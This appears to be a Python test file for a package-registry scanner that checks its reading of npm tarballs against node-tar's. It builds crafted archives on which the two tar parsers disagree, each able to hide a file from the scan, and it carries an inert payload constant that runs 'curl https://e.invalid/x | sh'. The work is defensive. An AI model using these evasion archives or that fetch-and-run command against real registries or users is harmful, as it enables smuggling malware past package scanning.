"""BR-4: an npm tarball is read by tarfile and checked against npm's own reading (registry/npmtar.py).

npm unpacks a package with node-tar; the registry read it with Python's tarfile alone, and the two parse tar
headers differently: the differential fuzzer (scripts/fuzz, `archive-npm-diff`) found entries npm writes that
the scan never read (a ustar prefix whose first byte is NUL and whose 131st is not: `/index.js` to node-tar,
`index.js`, a top-level file npm never writes, to tarfile) or read under another name (a pax global header's
`path`, an `N` header, a pax record with a newline, a name that is not UTF-8, a NUL before a newline), and a
regular file whose name ends in `/`, a directory to node-tar, which reads its data as the next headers. Each is
an archive the two readers disagree about: INCOMPLETE. Tarballs written the usual ways read the same in both.

Where node and npm's bundled node-tar are here, each case is also unpacked by node-tar as npm unpacks it, to show
what npm writes. Payloads are inert: hosts are .invalid, nothing is installed or run."""
import gzip
import io
import os
import subprocess
import tarfile
import tempfile
import unittest

from lazaret.registry import npmtar, repo
from tests.registry._review_support import issues, manifest, scan_bytes

EVIL = b"require('child_process').exec('curl https://e.invalid/x | sh');\n"
PJ = manifest(main="index.js").encode()


def header(name, size=0, typeflag=b"0", linkname=b"", magic=b"ustar\x0000", prefix=b"", patch=None):
    """A 512-byte ustar header, its checksum right: `patch` {offset: bytes} written last."""
    b = bytearray(512)
    b[0:len(name[:100])] = name[:100]
    b[100:108] = b"0000644\x00"
    b[108:116] = b"0000000\x00"
    b[116:124] = b"0000000\x00"
    b[124:136] = b"%011o\x00" % size
    b[136:148] = b"00000000000\x00"
    b[156:157] = typeflag
    b[157:157 + len(linkname)] = linkname
    b[257:265] = magic
    b[345:345 + len(prefix)] = prefix
    for off, value in (patch or {}).items():
        b[off:off + len(value)] = value
    b[148:156] = b" " * 8
    b[148:156] = b"%06o\x00 " % sum(b)
    return bytes(b)


def entry(name, data, **kw):
    return header(name, len(data), **kw) + data + b"\0" * (-len(data) % 512)


def pax(records, typeflag=b"x", name=b"PaxHeader/x"):
    body = b"".join(records)
    return entry(name, body, typeflag=typeflag)


def record(key, value):
    rest = b" " + key + b"=" + value + b"\n"
    n = len(rest) + 1
    while len(str(n).encode()) + len(rest) != n:
        n += 1
    return str(n).encode() + rest


def tgz(*parts):
    return gzip.compress(b"".join(parts) + b"\0" * 1024, mtime=0)


def corrupt(data):
    """The details of the corrupt members iter_archive gives an npm tarball."""
    return [m.detail for m in repo.iter_archive(data, "tgz", "npm") if m[3] == "corrupt"]


def node_tar():
    """(node, npm's bundled node-tar's folder), or None."""
    import shutil
    node = shutil.which("node")
    if not node:
        return None
    prefix = os.path.dirname(os.path.dirname(os.path.realpath(node)))
    for tar in (os.path.join(prefix, "lib", "node_modules", "npm", "node_modules", "tar"),
                os.path.join(os.path.dirname(os.path.realpath(node)), "node_modules", "npm", "node_modules", "tar")):
        if os.path.isdir(tar):
            return node, tar
    return None


NPM_X = ("const tar=require(process.argv[1]);const fs=require('fs');const path=require('path');"
         "tar.x({file:process.argv[2],cwd:process.argv[3],strip:1,sync:true,noChmod:true,noMtime:true,"
         "preserveOwner:false,filter:(p,e)=>{if(/Link$/.test(e.type))return false;if(/File$/.test(e.type))return true}"
         ",onwarn:()=>{}});const out={};const walk=(d)=>{for(const n of fs.readdirSync(d).sort()){const f=path.join(d,n);"
         "if(fs.lstatSync(f).isDirectory())walk(f);else out[path.relative(process.argv[3],f)]="
         "fs.readFileSync(f).toString('latin1')}};walk(process.argv[3]);console.log(JSON.stringify(out))")


def npm_writes(data):
    """{path: bytes} npm writes from this tarball (node-tar as pacote runs it), or None without node-tar."""
    import json
    found = node_tar()
    if not found:
        return None
    node, tar = found
    with tempfile.TemporaryDirectory() as d:
        path = os.path.join(d, "a.tgz")
        with open(path, "wb") as fh:
            fh.write(data)
        out = os.path.join(d, "out")
        os.mkdir(out)
        got = subprocess.run([node, "-e", NPM_X, tar, path, out], capture_output=True, text=True, timeout=30,
                             encoding="utf-8", errors="replace")
        if got.returncode != 0:
            return {}
        return {k: v.encode("latin-1") for k, v in json.loads(got.stdout).items()}


class DisagreementTests(unittest.TestCase):
    """Each archive npm reads one way and tarfile another: INCOMPLETE, and npm writes what the scan missed."""

    def check(self, data, needle, npm_path=None, npm_bytes=EVIL):
        found = corrupt(data)
        self.assertTrue(any(needle in d for d in found), found)
        res = scan_bytes(data)                         # (refused either way: what was read may be strong too)
        self.assertIn(res["verdict"], ("INCOMPLETE", "SUSPICIOUS"), res["verdictReason"])
        self.assertTrue(any(needle in i["msg"] for i in issues(res, "SC-TRUNCATED")), issues(res, "SC-TRUNCATED"))
        written = npm_writes(data)
        if written is not None and npm_path is not None:
            self.assertEqual(written.get(npm_path), npm_bytes, sorted(written))

    def test_a_prefix_that_starts_with_nul(self):
        # node-tar prepends the prefix field whenever its 131st byte is not NUL, even when it reads empty: `/index.js`,
        # which npm writes as index.js; tarfile read `index.js`, a top-level file npm never writes, and dropped it
        data = tgz(entry(b"package/package.json", PJ),
                   entry(b"index.js", EVIL, prefix=b"\x00" * 130 + b"x" * 25))
        self.check(data, "as 'index.js', which this reader does not extract", "index.js")

    def test_a_global_header_path(self):
        # tarfile renames every later entry to a global header's path; node-tar takes none: the package.json npm
        # writes was read as global.js
        data = tgz(pax([record(b"path", b"package/global.js")], typeflag=b"g", name=b"pax_global_header"),
                   entry(b"package/package.json", PJ), entry(b"package/index.js", EVIL))
        self.check(data, "as 'index.js', this reader read it as 'global.js'", "index.js")

    def test_a_file_named_as_a_directory(self):
        # a regular file whose name ends in `/` is a directory to node-tar (its size taken as 0), which reads the
        # file's data as the next headers: the entry inside is what npm writes
        inner = entry(b"package/index.js", EVIL)
        data = tgz(entry(b"package/package.json", PJ), entry(b"package/docs/", inner))
        self.check(data, "which this reader did not read as a file", "index.js")

    def test_a_file_with_a_link_name(self):
        # node-tar skips a file's header that has a link name, and reads its data as the next headers
        inner = entry(b"package/index.js", EVIL)
        data = tgz(entry(b"package/package.json", PJ), entry(b"package/notes.txt", inner, linkname=b"x"))
        self.check(data, "linkpath forbidden", "index.js")

    def test_a_pax_value_with_a_newline(self):
        # node-tar parses a pax header line by line: a value with a newline breaks its record, and the ustar
        # name stands; tarfile reads the record by its length
        data = tgz(entry(b"package/package.json", PJ),
                   pax([record(b"path", b"package/a\n.js")]), entry(b"package/index.js", EVIL))
        self.check(data, "as 'index.js', this reader read it as 'a\\n.js'", "index.js")

    def test_an_old_gnu_long_name(self):
        # an `N` header names the next file in node-tar, and is an entry of an unknown type to tarfile
        data = tgz(entry(b"package/package.json", PJ), entry(b"././@LongLink", b"package/index.js\x00", typeflag=b"N"),
                   entry(b"package/notes.js", EVIL))
        self.check(data, "as 'index.js', this reader read it as 'notes.js'", "index.js")

    def test_a_name_that_is_not_utf8(self):
        # U+FFFD in node-tar, a surrogate escape in tarfile: a main of `x\ufffd.js` names a file the scan read as
        # another name
        data = tgz(entry(b"package/package.json", manifest(main="x\ufffd.js").encode()),
                   entry(b"package/x\xe4.js", EVIL))
        self.check(data, "as 'x\ufffd.js', this reader read it as 'x\\udce4.js'", "x\ufffd.js")

    def test_a_nul_before_a_newline(self):
        # node-tar's /\0.*/ stops at a line terminator, so a name goes on after it (a field filled to its end, or
        # its NULs would stay in the path, which Node refuses); tarfile stops at the NUL
        name = b"package/a.js\x00\n" + b"b" * 86
        data = tgz(entry(b"package/package.json", PJ), entry(name, EVIL))
        self.check(data, "this reader read it as 'a.js'", "a.js\n" + "b" * 86)

    def test_a_unc_root_written_with_backslashes(self):
        # node-tar takes a UNC root off by Windows' rules on every platform: npm on Linux and macOS writes
        # package/\\\\srv\\sh\\index.js as index.js; npm on Windows, where backslashes are separators, as
        # srv/sh/index.js, which is how the registry reads it
        data = tgz(entry(b"package/package.json", PJ), entry(b"package/\\\\srv\\sh\\index.js", EVIL))
        self.check(data, "as 'index.js', this reader read it as 'srv/sh/index.js'", "index.js")


class RootTests(unittest.TestCase):
    def test_a_drive_relative_root(self):
        # `C:index.js` is index.js to node-tar, on every platform: the registry reads it so too (it kept `C:`)
        self.assertEqual(repo.canonical_member_path("package/C:index.js", "npm"), ("index.js", None))
        self.assertEqual(repo.canonical_member_path("package/C:/D:x/a.js", "npm"), ("x/a.js", None))
        data = tgz(entry(b"package/package.json", PJ), entry(b"package/C:index.js", EVIL))
        self.assertEqual(corrupt(data), [])
        self.assertIn("index.js", [m[0] for m in repo.iter_archive(data, "tgz", "npm") if m[3] is None])
        written = npm_writes(data)
        if written is not None:
            self.assertEqual(written.get("index.js"), EVIL)

    def test_node_tars_roots(self):
        cases = {"C:index.js": ("C:", "index.js"), "//srv/sh/x": ("//", "srv/sh/x"),
                 "\\\\srv\\sh\\x": ("\\\\srv\\sh\\", "x"), "//?/C:/x": ("//?/C:/", "x"),
                 "C:C:x": ("C:C:", "x"), "/C:x": ("/C:", "x"), "c:/d:/x": ("c:/d:/", "x"), "x": ("", "x"),
                 "1:x": ("", "1:x")}
        for path, want in cases.items():
            with self.subTest(path=path):
                self.assertEqual(npmtar.strip_absolute(path), want)


class AgreementTests(unittest.TestCase):
    """What npm, yarn, pnpm, bun, git and Python's tarfile write reads the same in both."""

    def formats(self):
        files = [("package/package.json", PJ), ("package/index.js", b"module.exports = 1;\n"),
                 ("package/" + "d" * 120 + "/long.js", b"1;\n"), ("package/caf\u00e9/\u4e2d.js", b"2;\n"),
                 ("package/" + "e" * 60 + "/" + "f" * 60 + "/" + "g" * 60 + ".js", b"3;\n")]
        for fmt in (tarfile.USTAR_FORMAT, tarfile.GNU_FORMAT, tarfile.PAX_FORMAT):
            buf = io.BytesIO()
            with tarfile.open(fileobj=buf, mode="w", format=fmt, encoding="utf-8") as tf:
                for name, data in files:
                    if fmt == tarfile.USTAR_FORMAT and len(name.encode()) > 255:
                        continue
                    info = tarfile.TarInfo(name)
                    info.size = len(data)
                    tf.addfile(info, io.BytesIO(data))
                d = tarfile.TarInfo("package/lib")
                d.type = tarfile.DIRTYPE
                tf.addfile(d)
                link = tarfile.TarInfo("package/link.js")
                link.type = tarfile.SYMTYPE
                link.linkname = "index.js"
                tf.addfile(link)
            yield fmt, gzip.compress(buf.getvalue(), mtime=0)

    def test_tarfile_formats(self):
        for fmt, data in self.formats():
            with self.subTest(format=fmt):
                self.assertEqual(corrupt(data), [])

    def test_a_global_comment_as_git_archive_writes_it(self):
        data = tgz(pax([record(b"comment", b"0123456789abcdef0123456789abcdef01234567")], typeflag=b"g",
                       name=b"pax_global_header"),
                   entry(b"package/package.json", PJ), entry(b"package/index.js", b"1;\n"))
        self.assertEqual(corrupt(data), [])

    def test_a_long_name_and_a_pax_header(self):
        name = b"package/" + b"n" * 150 + b".js"
        data = tgz(entry(b"././@LongLink", name + b"\x00", typeflag=b"L"), entry(name[:100], b"1;\n"),
                   pax([record(b"path", b"package/p" + b"q" * 200 + b".js"), record(b"mtime", b"1700000000.5")]),
                   entry(b"package/short.js", b"2;\n"))
        self.assertEqual(corrupt(data), [])

    def test_npm_packs_and_node_tar_reads(self):
        # a tarball node-tar writes (as npm pack does) reads the same in both
        found = node_tar()
        if not found:
            self.skipTest("node / npm's bundled node-tar not available")
        node, tar = found
        with tempfile.TemporaryDirectory() as d:
            pkg = os.path.join(d, "package")
            for rel, data in (("package.json", PJ), ("index.js", b"1;\n"), ("lib/" + "x" * 120 + ".js", b"2;\n"),
                              ("caf\u00e9/\u4e2d.js", b"3;\n"), ("a" * 90 + "/" + "b" * 90 + "/c.js", b"4;\n")):
                path = os.path.join(pkg, *rel.split("/"))
                os.makedirs(os.path.dirname(path), exist_ok=True)
                with open(path, "wb") as fh:
                    fh.write(data)
            out = os.path.join(d, "p.tgz")
            subprocess.run([node, "-e", "require(process.argv[1]).c({gzip:true,file:process.argv[2],cwd:process.argv[3],"
                            "sync:true,portable:true},['package'])", tar, out, d], check=True, timeout=30)
            with open(out, "rb") as fh:
                data = fh.read()
        self.assertEqual(corrupt(data), [])
        self.assertEqual(sorted(npm_writes(data)), sorted(m[0] for m in repo.iter_archive(data, "tgz", "npm")
                                                         if m[3] is None))


class ReaderTests(unittest.TestCase):
    """npmtar.NodeTar's own readings."""

    def read(self, raw):
        node = npmtar.NodeTar()
        for at in range(0, len(raw), 700):                 # (fed in pieces that do not fall on blocks)
            node.feed(raw[at:at + 700])
        return node.finish()

    def test_entries_and_where_their_data_is(self):
        raw = entry(b"package/a.js", b"1;\n") + entry(b"package/b.js", b"x" * 600) + b"\0" * 1024
        files = self.read(raw).files
        self.assertEqual(files, [("package/a.js", 512, 3), ("package/b.js", 1536, 600)])

    def test_two_null_blocks_end_it(self):
        raw = entry(b"package/a.js", b"1;\n") + b"\0" * 1024 + entry(b"package/after.js", b"2;\n")
        self.assertEqual([f[0] for f in self.read(raw).files], ["package/a.js"])
        raw = entry(b"package/a.js", b"1;\n") + b"\0" * 512 + entry(b"package/after.js", b"2;\n")
        self.assertEqual([f[0] for f in self.read(raw).files], ["package/a.js", "package/after.js"])

    def test_numbers_as_javascript_reads_them(self):
        self.assertEqual(npmtar._dec_number(b"0000644 \x00"), 0o644)
        self.assertEqual(npmtar._dec_number(b" 12x\x00"), 0o12)
        self.assertIsNone(npmtar._dec_number(b"\x00" * 8))
        self.assertEqual(npmtar._dec_number(b"\x80" + b"\x00" * 6 + b"\x01"), 1)
        with self.assertRaises(npmtar._Invalid):
            npmtar._dec_number(b"\x81" + b"\x00" * 7)

    def test_strings_as_javascript_reads_them(self):
        self.assertEqual(npmtar._dec_string(b"a.js\x00junk"), "a.js")
        self.assertEqual(npmtar._dec_string(b"a.js\x00x\ny\x00z"), "a.js\ny\x00z")
        self.assertEqual(npmtar._dec_string(b"x\xe4.js"), "x\ufffd.js")

    def test_a_truncated_entry(self):
        node = self.read(entry(b"package/a.js", b"x" * 1000)[:900])
        self.assertIn("TAR_BAD_ARCHIVE", [c for c, _m in node.warnings])
        self.assertEqual([(p, n) for p, _at, n in node.files], [("package/a.js", 388)])


if __name__ == "__main__":
    unittest.main()
